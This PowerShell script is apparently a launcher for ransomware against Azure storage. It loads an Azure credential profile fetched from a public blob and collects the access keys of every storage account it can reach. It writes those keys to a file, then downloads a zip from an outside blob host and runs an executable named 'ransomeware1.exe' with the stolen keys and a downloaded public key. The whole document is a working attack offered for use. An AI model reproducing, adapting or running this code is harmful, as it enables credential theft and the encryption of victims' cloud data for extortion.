Param(
  [string]$StorageAccountName
)

$cmdName = "Import-AzureRmContext"
If (!(Get-Command $cmdName -errorAction SilentlyContinue))
{
    Install-PackageProvider -Name NuGet -MinimumVersion 2.8.5.201 -Force
    Get-Module PowerShellGet -list | Select-Object Name,Version,Path
    Install-Module AzureRM -AllowClobber -Force -SkipPublisherCheck
    Set-ExecutionPolicy Unrestricted -Force
}

#invoke credentials (given url)
$file = "azureprofile.json"

$url = "https://" + $StorageAccountName + ".blob.core.windows.net/public/" + $file

Invoke-WebRequest -Uri $url -OutFile $file

Import-AzureRmContext -Path (Get-Item "azureprofile.json").FullName

$name = ""
$key = ""
$subscriptions = Get-AzureRmSubscription
foreach ($sub in $subscriptions) {

  Set-AzureRmContext -SubscriptionId $sub.SubscriptionId -TenantId $sub.TenantId
  $resources = Get-AzureRmResource
  $output_creds = New-Object System.Collections.ArrayList

  $y = ""
  foreach ($resource in $resources) {

     If ($resource.ResourceType -eq "Microsoft.Storage/storageAccounts" -and $resource.Name -ne $StorageAccountName) {
         $y = Invoke-AzureRmResourceAction -Action listKeys -ResourceType "Microsoft.Storage/storageAccounts" `
         -ResourceGroupName $resource.ResourceGroupName -Name $resource.ResourceName -Force -Confirm:$false
         
         $output_creds.AddRange(($resource.Name, $y.keys[0].value))
         # $last = (($resource.Name, $y.keys[0].value))
         $name = $resource.Name
         $key = $y.keys[0].value
     } 
  }

  #save creds locally
  echo $output_creds | Out-File ($sub.Name + "storage_creds.txt")
  
}
echo $output_creds
$storage_keys_file = (Get-Item ($sub.Name + "storage_creds.txt")).FullName
# Now get the C# code and run it.

#create App.config file

#$connctionString1="DefaultEndpointsProtocol=https;AccountName="
#$connectionString2=";AccountKey="
#$connectionString3 = ";EndpointSuffix=core.windows.net"
#$connectionString = $connctionString1 + $name + $connectionString2 + $key + $connectionString3

$url = "https://runonvm.blob.core.windows.net/public/Debug.zip"
$file = "prog.zip"
Invoke-WebRequest -Uri $url -OutFile $file

Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
$file = (Get-Item $file).FullName
$destination = ((Get-Item .).FullName) + "\program"
Unzip $file $destination

$url = "https://runonvm.blob.core.windows.net/public/public_key.pem"
$file = "public_key.pem"
Invoke-WebRequest -Uri $url -OutFile $file
$public_key_file = (Get-Item $file).FullName

.\program\Debug\ransomeware1.exe $storage_keys_file $public_key_file 